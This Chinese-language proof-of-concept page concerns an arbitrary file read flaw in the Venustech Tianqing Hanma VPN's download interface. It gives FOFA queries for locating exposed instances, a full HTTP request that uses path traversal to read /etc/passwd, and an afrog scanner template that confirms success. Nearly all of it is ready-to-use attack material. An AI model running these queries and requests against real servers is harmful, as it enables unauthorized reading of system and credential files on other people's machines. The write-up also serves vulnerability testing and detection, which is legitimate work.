# 启明星辰-天清汉马VPN接口download任意文件读取

启明星辰天清汉马VPN系统download接口处存在任意文件读取漏洞，获取服务器的敏感数据和配置信息，造成系统的不安全性，从而控制服务器。

## fofa

```yaml
icon_hash="-15980305"
app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input") || app="启明星辰-天清汉马VPN"
```

![image-20240713133021846](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407131330925.png)

## poc

```yaml
GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Cookie: VSG_VERIFYCODE_CONF=0-0; VSG_CLIENT_RUNNING=false; VSG_LANGUAGE=zh_CN; VSG_CSRFTOKEN=1ec96cd6acc254fcf9e9cd6d1e85cf23
Host: 
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
```

![image-20240713133201088](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407131332139.png)

## afrog poc

```yaml
id: 启明星辰-天清汉马VPN接口download任意文件读取
info:
  name: 启明星辰-天清汉马VPN接口download任意文件读取
  author: wy876

  severity: high
  description: |
     启明星辰天清汉马VPN系统download接口处存在任意文件读取漏洞，获取服务器的敏感数据和配置信息，造成系统的不安全性，从而控制服务器。
     Fofa: icon_hash="-15980305"
           app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input") || app="启明星辰-天清汉马VPN"
  reference:
    - https://github.com/wy876/POC/blob/main/启明星辰-天清汉马VPN接口download任意文件读取.md


rules:
  r0:
    request:
      method: GET
      path: /vpn/user/download/client?ostype=../../../../../../../etc/passwd
    expression: response.status == 200 && response.body.bcontains(b'root:x:0:0')

expression: r0()
```

